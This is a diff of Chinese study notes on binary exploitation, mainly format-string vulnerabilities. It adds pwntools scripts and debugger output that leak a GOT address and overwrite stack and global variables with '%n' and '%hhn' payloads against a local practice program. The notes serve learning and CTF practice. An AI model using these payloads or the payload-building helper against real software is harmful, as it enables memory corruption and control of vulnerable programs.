@@ -967,7 +967,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 ### ROP
 
-> ROP(Return Oriented Programming)   栈溢出问题
+> ROP(Return Oriented Programming)   面向返回编程    栈溢出问题
 >
 > 核心在于利用指令集中的 `ret` 指令，改变了指令流的执行顺序
 >
@@ -1066,7 +1066,6 @@ sh.interactive() # 将代码交互转换为手工交互
 > 操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间
 >
 > 库函数：系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核核心态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。
->
 
 - Linux 系统调用通过 `int 80h` 实现，用系统调用号区分入口函数。操作系统实现系统调用的基本过程：
 
@@ -1143,11 +1142,11 @@ addr of format string: Color %s, Number %d, Float, %4.2f # format string 格式�
 
 进入`printf`后，首先获取第一个参数format string，一个一个读取字符，分析逻辑如下：
 
-- 当前字符不是%，直接输出到相应标准输出。
-- 当前字符是%， 继续读取下一个字符
-  - 如果没有字符，报错
-  - 如果下一个字符是%,输出%
-  - 否则根据相应的字符，获取相应的参数，对其进行解析并输出
+1. 当前字符不是%，直接输出到相应标准输出
+2. 当前字符是%， 继续读取下一个字符：
+   1. 如果没有字符，报错
+   2. 如果下一个字符是%，输出%
+   3. 否则根据相应的字符，获取相应的参数，对其进行解析并输出
 
 那么，当程序为`printf("Color %s, Number %d, Float %4.2f");`，程序继续运行，将栈上格式化字符串上面的三个变量分别解析为：解析其地址对应的字符串，解析其内容对应的整形值，解析其内容对应的浮点值。
 
@@ -1324,31 +1323,28 @@ f7e8b6bb # 输出的内容为 0xffffcd0c│+0x10: 0xf7e8b6bb 即esp+0x10 为prin
 
 ##### 泄露任意地址的内存
 
-- 上例中 s 是 main 函数的局部变量，所以读取到的内容都是在栈上的。调用输出函数printf时，第一个参数的值其实就是格式化字符串format string的地址
+- 上例中 s 是 main 函数的局部变量，所以读取到的内容在栈上。调用输出函数`printf`时，第一个参数的值其实就是格式化字符串format string的地址
 - 当上例`leakmemory.c`的输入为"%s"，可以看到`printf`的栈上参数 1 和 2 均指向`%s`，第一个`%s`指的是`printf`的格式化字符串地址，而第二个`%s`则是格式化字符串的`%s`对应参数。亦即：第二个`%s`被作为参数传递给第一个作为格式化字符串使用的`%s`
 ```assembly
-──────────────────────────────────[ stack ]──── # printf(s); 的栈
+──────────────────────────────────[ stack ]──── # printf(s); 的栈 # 当上例 leakmemory.c 的输入为"%s"
 0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
-0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?) # format string's address # 这个是printf的格式化字符串
+0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?) # 0xffffcd10: format string's address # 该地址存储 printf 的格式化字符串的地址
 0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 ("%s"?) # char* (address) as format string's 1st parameter # 格式化字符串的第一个参数
 0xffffcd08│+0x0c: 0x000000c2
 0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
-0xffffcd10│+0x14: 0xff007325 ("%s"?)     ← $eax # "%s" 's address # 既被用作格式化字符串 也被用作格式化字符串的第一个参数
+0xffffcd10│+0x14: 0xff007325 ("%s"?)  ← $eax # string "%s" 0x25=% 0x73=s # 既被用作格式化字符串 也被用作格式化字符串的第一个参数
 ```
-
-- 由于可以控制该格式化字符串，若知道该格式化字符串在输出函数调用时是第几个参数，就可以通过如下的方式来获取某个指定地址addr的内容。
 
 ```c
-printf("addr%k$s"); // 假设格式化字符串相对函数调用为第k个参数 addr要被替换为地址，高概率为不可见字符
+printf("addr%k$s"); // 获取某个指定地址addr的内容的方法
+// 假设格式化字符串相对函数调用为第k个参数 addr是个地址，高概率为不可见字符。 // k: 格式化字符串地址相对于 printf 第一个参数来说是第k个参数
 ```
 
-- 确定该格式化字符串为第几个参数的方式：
+- `printf("addr%k$s")`**原理**：`printf`的第一个参数为format string的地址，`addr`被存储在format string的开头。用`%k$s`控制`printf`解析对于第一个参数（即 存储format string地址的地址）来说第`k`个参数(即format string)，将其解析为字符串的地址。也就达到了将`addr`视作地址，输出`addr`上内容的目的。
 
-```c
-[tag]%p%p%p%p%p%p...
-```
 
-- 重复某个字符的机器字长来作为tag(32bit ELF下为4byte char)，后面跟上若干`%p`输出栈上的内容，如果内容与tag重复，那么就有很大把握说明该地址是格式化字符串的地址
+
+- 确定该格式化字符串为第几个参数的方式：  `[tag]%p%p%p%p%p%p...`     重复某个字符的机器字长来作为tag(32bit ELF下为4byte char)，后面跟上若干`%p`输出栈上的内容，如果内容与tag重复，就有很大把握说明该地址是格式化字符串的地址
 
 ```bash
 $ ./leakmemory     # [tag]%p%p%p%p%p%p... 方法确定 格式化字符串 是函数的第几个参数
@@ -1362,18 +1358,17 @@ AAAA0xffffd3a00xf7fcb4100x80491890x414141410x702570250x702570250x702570250x70257
 ```assembly
 ────────── stack ──── # 输入 AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 时 # printf(s); 的栈
 0xffffd38c│+0x0000: 0x080491e5  →  <main+115> add esp, 0x10      ← $esp
-0xffffd390│+0x0004: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+0xffffd390│+0x0004: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" # 0xffffd3a0 为 format string 的地址
 0xffffd394│+0x0008: 0xffffd3a0  →  "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
 0xffffd398│+0x000c: 0xf7fcb410  →  0x080482b8  →  "GLIBC_2.0"
 0xffffd39c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
-0xffffd3a0│+0x0014: "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
-0xffffd3a4│+0x0018: "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
-0xffffd3a8│+0x001c: "%p%p%p%p%p%p%p%p%p%p%p%p%p"
+0xffffd3a0│+0x0014: "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" # format string 所在的地址 # 相对于0xffffd390来说是第 4 个参数
+0xffffd3a4│+0x0018: "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p" .........
 ```
 
 
 
-- 输出 scanf 地址的脚本，疑似由于某些额外的保护措施，导致无法输出scanf的地址
+- 输出 scanf 地址的脚本，疑似由于某些额外的保护措施/gcc的影响，导致无法输出scanf的地址
 
 ```python
 from pwn import *   # 分析 leakmemory.c 的脚本 可以输出 scanf 的地址 # 有效性存疑
@@ -1382,14 +1377,15 @@ sh = process('./leakmemory')
 leakmemory = ELF('./leakmemory')
 __isoc99_scanf_got = leakmemory.got['__isoc99_scanf']  # __isoc99_scanf 的got表项地址
 print("__isoc99_scanf_got: ", hex(__isoc99_scanf_got))  # __isoc99_scanf_got:  0x804c014
-payload = p32(__isoc99_scanf_got) + b'%4$s'
+payload = p32(__isoc99_scanf_got) + b'%4$s' # scanf 的got表地址 + %4$s
 print("payload:", payload) # payload: b'\x14\xc0\x04\x08%4$s'
-gdb.attach(sh) # [+] Waiting for debugger: Done
+# gdb.attach(sh) # [+] Waiting for debugger: Done
 sh.sendline(payload) # Sent 0x9 bytes: 14 c0 04 08  25 34 24 73  0a  │····│%4$s│·│
 sh.recvuntil(b'%4$s\n')
-temp = sh.recv()
+temp = sh.recv() # 按照原本脚本的意思 这里应该收到8 bytes 前4byte为__isoc99_scanf_got，后 4byte 为__isoc99_scanf_got上存储的内容
 print("sh.recv(): ", temp, type(temp), len(temp)) # sh.recv():  b'\x14\xc0\x04\x08' <class 'bytes'> 4
 print("hex(u32(temp)): ", hex(u32(temp))) # hex(u32(temp)):  0x804c014
+temp = sh.recv()
 # print(hex(u32(sh.recv()[4:8])))  # remove the first bytes of __isoc99_scanf@got
 sh.interactive()
 ```
@@ -1451,7 +1447,7 @@ gef➤  c  # Continuing.
 0xfff70244│+0x0008: 0xfff70250  →  0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax>
 0xfff70248│+0x000c: 0xf7f84410  →  0x080482b8  →  "GLIBC_2.0"
 0xfff7024c│+0x0010: 0x08049189  →  <main+23> add ebx, 0x2e77
-0xfff70250│+0x0014: 0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax> # 0xfff70250 指向这
+0xfff70250│+0x0014: 0x0804c014  →  0xf7dd9100  →  <__isoc99_scanf+0> call 0xf7ec63a9 <__x86.get_pc_thunk.ax> # format string所在位置
 0xfff70254│+0x0018: "%4$s"
 0xfff70258│+0x001c: 0xf7fb6900  →  0xf7fb6980  →  0x00000000
 ────────────────────────────────────────── trace ────
@@ -1496,30 +1492,28 @@ gef➤  c  # Continuing.
 3. 进行覆盖
 
 ```c
-#include <stdio.h> // overwrite.c // gcc -fno-stack-protector -m32 -o -no-pie overwrite overwrite.c
-int a = 123, b = 456;
+#include <stdio.h> // 示例程序 overwrite.c // gcc -fno-stack-protector -m32 -o -no-pie overwrite overwrite.c
+int a = 123, b = 456; // 后续在覆盖任意地址内存中，想要覆盖的变量
 int main() {
-    int c = 789; // 0x315 // 后续再覆盖栈内存中，想要覆盖的变量
+    int c = 789; // 0x315 // 后续在覆盖栈内存中，想要覆盖的变量
     char s[100];
-    printf("%p\n", &c);
+    printf("%p\n", &c); // 程序这里已经输出了c的地址
     scanf("%s", s);
-    printf(s);
-    if (c == 16) {
+    printf(s); // 漏洞利用点
+    if (c == 16) { // 覆盖栈内存 一节中想要命中的判断
         puts("modified c.");
-    } else if (a == 2) {
+    } else if (a == 2) { // 覆盖任意地址内存 覆盖为小数字 一节中想要命中的判断
         puts("modified a for a small number.");
-    } else if (b == 0x12345678) {
+    } else if (b == 0x12345678) { // 覆盖任意地址内存 覆盖为大数字 一节中想要命中的判断
         puts("modified b for a big number!");
     }
     return 0;
 }
 ```
 
-
-
 ##### 覆盖栈内存
 
-- `p32(c_addr)`为4B(4 char)，是c的地址，为凑齐16B (16 char)，需要用`%012d`来再输出多12个字符，然后用`%6$n`将输出的字符个数
+- `p32(c_addr)`为4B(4 char)，是c的地址，为凑齐16B (16 char)，需要用`%012d`来再输出多12个字符，然后用`%6$n`将输出的字符个数，即16，写到变量c去。`%6$n`的 6 表示format string相对于栈第一个参数来说是第6个参数(即`printf`的第7个参数)，可以通过gdb调试分析漏洞利用点`printf`的栈帧得到
 
 ```python
 from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
@@ -1555,7 +1549,7 @@ b'\xbc\x82\xd5\xff%012d%6$n'  # [addr of c, %012d%6$n ]
     00000000  bc 82 d5 ff  2d 30 30 30  30 32 37 38  34 36 38 30  │····│-000│0278│4680│
     00000010  6d 6f 64 69  66 69 65 64  20 63 2e 0a               │modi│fied│ c.·│
     0000001c
-b'\xbc\x82\xd5\xff-00002784680modified c.\n'  ......  # print(sh.recv()) 
+b'\xbc\x82\xd5\xff-00002784680modified c.\n'  ......  # print(sh.recv())  # modified c 表明 c 已经被更改为 16
 ```
 
 - `printf(s);` 时的栈：
@@ -1569,7 +1563,7 @@ b'\xbc\x82\xd5\xff-00002784680modified c.\n'  ......  # print(sh.recv())
 0xffd5824c│+0x0010: 0x00000001
 0xffd58250│+0x0014: 0x00000000
 0xffd58254│+0x0018: 0x00000001
-0xffd58258│+0x001c: 0xffd582bc  →  0x00000315 # 0xffd58258 为格式化字符串所在的地址
+0xffd58258│+0x001c: 0xffd582bc  →  0x00000315 # 0xffd58258 为format string起始地址 0xffd582bc为c的地址 # 0x315=789 c的原始值 
 ────────────── trace ────
 [#0] 0xf7d5b060 → __printf(format=0xffd58258 "\274\202\325\377%012d%6$n")
 [#1] 0x80484d7 → main()
@@ -1579,17 +1573,162 @@ gef➤  hexdump byte 0xffd58258 32 # 以bytes显示格式化字符串所在地�
 ```
 
 - `0xffd58258`为格式化字符串format string的首地址，`0xffd58258`上的前4byte又是变量c的地址`0xffd582bc``
-- `%6$n`将输出的字符数存储到format string的第6个参数(`0xffd58258`)所存的整型指针(c的地址`0xffd582bc`)上。效果：把c的值覆盖为16
+- `%6$n`将输出的字符数(16)存储到format string的第6个参数(`0xffd58258`)所存的整型指针(c的地址`0xffd582bc`)上。效果：把c的值覆盖为16
 
 
 
 ##### 覆盖任意地址内存
 
-> 修改 data 段的变量为：1. 一个小数字(小于机器字长的数字)；2. 一个小数字。
+> 修改 data 段的变量为：1. 一个小数字(小于机器字长的数字)；2. 一个大数字
+
+- 这一节及下一节将要实现：
+  1. 将全局变量 a 覆盖为2。利用payload `aa%k$nbb[addr]`
+  2. 将全局变量 b 覆盖为 0x12345678。利用`%6$hhn`分多部分覆盖
 
 
 
+- 将全局变量a覆盖为2的方法：`aa%8$nbb[addr]`。由前面的分析，format string相对于`printf`第 1 个参数来说是第 6 个参数，而现在`aa%8`占据了第6个参数，`$nbb`占据了第7个参数，所以`[addr]`就变成了第8个参数。同理，可以使用`aa%9$nbbcccc[addr]`... 这里以4为倍数，用b来凑数对齐，是因为程序是32bit程序
 
+```cpp
+aa%k$nbb[addr]  // tips: 该例说明地址不一定要放在format string开头
+```
+
+- a的数量取决于想将[addr]覆盖为多少，b的数量则取决于机器字长(32/64 bit)，k 取决于 aa%k$nbb 总长度与原本 format string 是第几个参数
+
+```python
+from pwn import *  # 将 overwrite.c 中的变量 c 覆盖为16
+def fora():
+    sh = process('./overwrite')
+    a_addr = 0x0804A024 # 该地址通过IDA静态分析得到，a是已初始化全局变量，在.data段，不在堆栈上
+    payload = b'aa%8$nbb' + p32(a_addr) # aa%8$nbb[addr] # aa输出两个字符，%8$n
+    sh.sendline(payload)
+    print(sh.recv()) # 0xff9ac76c\naabb$\xa0\x04\x08modified a for a small number.\n
+    sh.interactive()
+context.log_level = "DEBUG"
+fora()
+```
+
+```bash
+$ python overwrite.py # 运行上述脚本
+[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 2581307
+[DEBUG] Sent 0xd bytes:
+    00000000  61 61 25 38  24 6e 62 62  24 a0 04 08  0a           │aa%8│$nbb│$···│·│ # payload: aa%8$nbb[addr]
+    0000000d
+[DEBUG] Received 0x32 bytes:
+    00000000  30 78 66 66  39 61 63 37  36 63 0a 61  61 62 62 24  │0xff│9ac7│6c·a│abb$│ # recv: printf("%p\n", &c); aabb
+    00000010  a0 04 08 6d  6f 64 69 66  69 65 64 20  61 20 66 6f  │···m│odif│ied │a fo│ # 0804A024 为全局变量 a 的地址
+    00000020  72 20 61 20  73 6d 61 6c  6c 20 6e 75  6d 62 65 72  │r a │smal│l nu│mber│ # modified a for a small number.
+    00000030  2e 0a                                               │.·│                  # 说明命中了 else if (a == 2) 分支
+    00000032
+b'0xff9ac76c\naabb$\xa0\x04\x08modified a for a small number.\n'   .........
+```
+
+
+
+##### 用 hh / h 分块覆盖
+
+>  本节将全局变量 b 覆盖为 0x12345678。注意本节默认已经得到了fmt str 地址相对于printf第 1 个参数为第 6 个参数
+
+- `hh` 对于整数类型，`printf`期待一个从`char`提升的`int`尺寸的整型参数。`$hhn`会把输出字符数存在一`char`地址上，即覆盖指针指向的地址上的 1Byte
+- `h`  对于整数类型，`printf`期待一个从`short`提升的`int`尺寸的整型参数。`$hn`会把输出字符数存在一`short`地址上，即覆盖指针指向的地址上的 2Byte
+
+在 x86 和 x64 的体系结构中，变量的存储格式为以**小端**存储，即最低有效位存储在低地址。即希望按照如下方式覆盖（左边为地址，右边为覆盖内容）：
+
+```python
+0x0804A028 0x78 # 该地址为全局变量 b 的地址(占4B) 由IDA分析得出
+0x0804A029 0x56
+0x0804A02a 0x34
+0x0804A02b 0x12
+```
+- 故可构造如下payload，其中padx用于控制后面的`'%6$hhn'`写入的数字是多少
+```python
+p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$hhn'+pad2+'%7$hhn'+pad3+'%8$hhn'+pad4+'%9$hhn'
+```
+
+- 在程序中需要对pad的大小进行计算，如果pad大小应为x，则使用`%xc`输出x个字符，如果当前已输出字符数过大，则再输出过量字符，以`0xff`为上界溢出
+
+```python
+from pwn import *  # 将 overwrite.c 中的全局变量 b 覆盖为 0x12345678
+def fmt(prev, word, index): # 构造 padx + '%k$hhn'
+    # prev: 前一个写入的数字[0, 0xff]
+    # word: 将要写入的数字[0, 0xff]  # 利用类似 %kc / %5c 补充 k / 5 个字符
+    # index: 该数字将要写入的地址存在第 index 个参数(相对于fmt str指针来说)
+    fmtstr = b""
+    if(prev < word):  # 前一个数字 比 将要写入的数字 小
+        result = word - prev  # 追加输出相差的字符数 word - prev 个
+        fmtstr = b"%" + bytearray(str(result), "ascii") + b"c" # 构造 %xc 输出 x 个char
+    elif(prev == word):  # 前一个数字 和 将要写入的数字 相等，不需要追加输出字符
+        pass  # 直接跳到构造 %k$hhn 的步骤，写入的数字与前一个相同
+    else:  # prev > word # 前一个数字 比 将要写入的数字 大
+        result = 256 + word - prev  # 以 0xff 为上限溢出
+        fmtstr = b"%" + bytearray(str(result), "ascii") + b"c" # 构造 %xc 输出 x 个char
+    fmtstr += b"%" + bytearray(str(index), "ascii") + b"$hhn"  # 构造 %k$hhn
+    return fmtstr
+
+def fmt_str(offset, size, addr, target): # 构造整个payload 
+    # offset: 要覆盖的地址最初的偏移; size:机器字长; addr: 将要覆盖的地址; target: 要覆盖为的目的变量值
+    payload = b""
+    for i in range(4):
+        if(size == 4):
+            payload += p32(addr + i)  # 32bit 程序
+        else:
+            payload += p64(addr + i)  # 64bit 程序
+    print(payload.hex())  # 28a0040829a004082aa004082ba00408 # 此时payload内容为4个地址
+    prev = len(payload)  # 0x10 # 4个32bit的地址 4*4B = 0x10 B
+    for i in range(4):
+        # 具体传参: 0x10 0x78 0x6; 0x78 0x56 0x7; 0x56 0x34 0x8; 0x34 0x12 0x9
+        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
+        prev = (target >> i * 8) & 0xff
+    return payload
+
+def forb(): # exploit
+    sh = process('./overwrite')
+    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)  # 0x0804A028：全局变量b的地址，IDA分析可得
+    print("payload:", payload, "\npayload:", payload.hex())
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+
+context.log_level = "DEBUG"
+forb()
+```
+
+- 上方脚本的运行结果如下: 
+
+```bash
+$ python overwrite.py # 将 overwrite.c 中的全局变量 b 覆盖为 0x12345678
+[+] Starting local process './overwrite' argv=[b'./overwrite'] : pid 2582229
+28a0040829a004082aa004082ba00408 # 0804A028 为全局变量 b 的地址
+payload: b'(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn'
+payload: 28a0040829a004082aa004082ba00408253130346325362468686e253232326325372468686e253232326325382468686e253232326325392468686e
+[DEBUG] Sent 0x3d bytes:
+    00000000  28 a0 04 08  29 a0 04 08  2a a0 04 08  2b a0 04 08  │(···│)···│*···│+···│
+    00000010  25 31 30 34  63 25 36 24  68 68 6e 25  32 32 32 63  │%104│c%6$│hhn%│222c│
+    00000020  25 37 24 68  68 6e 25 32  32 32 63 25  38 24 68 68  │%7$h│hn%2│22c%│8$hh│
+    00000030  6e 25 32 32  32 63 25 39  24 68 68 6e  0a           │n%22│2c%9│$hhn│·│
+    0000003d
+[DEBUG] Received 0x33a bytes:
+    00000000  30 78 66 66  65 31 33 37  66 63 0a 28  a0 04 08 29  │0xff│e137│fc·(│···)│
+    00000010  a0 04 08 2a  a0 04 08 2b  a0 04 08 20  20 20 20 20  │···*│···+│··· │    │
+    00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000080  20 20 98 20  20 20 20 20  20 20 20 20  20 20 20 20  │  · │    │    │    │
+    00000090  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000160  10 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │·   │    │    │    │
+    00000170  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000230  20 20 20 20  20 20 20 20  20 20 20 20  20 20 01 20  │    │    │    │  · │
+    00000240  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000310  20 20 20 20  20 20 20 20  20 20 20 20  00 6d 6f 64  │    │    │    │·mod│
+    00000320  69 66 69 65  64 20 62 20  66 6f 72 20  61 20 62 69  │ifie│d b │for │a bi│
+    00000330  67 20 6e 75  6d 62 65 72  21 0a                     │g nu│mber│!·│
+    0000033a
+b'0xffe137fc\n(\xa0\x04\x08)\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08                                                                                                       \x98                                                                                                                                                                                                                             \x10                                                                                                                                                                                                                             \x01                                                                                                                                                                                                                             \x00modified b for a big number!\n'
+```
+
+> 也可以利用 `%n` 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用`%hhn` 则不会有这样的问题，因为这样只会修改相应地址的一个字节
 
 
 
